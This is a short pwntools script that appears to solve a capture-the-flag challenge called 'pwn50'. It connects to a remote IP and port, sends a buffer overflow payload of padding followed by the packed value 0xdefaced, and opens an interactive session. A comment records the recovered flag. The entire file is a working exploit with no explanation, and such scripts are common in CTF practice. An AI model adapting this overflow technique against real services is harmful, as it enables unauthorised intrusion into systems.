from pwn import *

#r=process('./pwn50')
r=remote('54.67.102.66','5251')

pay="bug"+"A"*21+p64(0xdefaced)

r.send(pay)

r.interactive()

#Bugs_Bunny{lool_cool_stuf_even_its_old!!!!!}

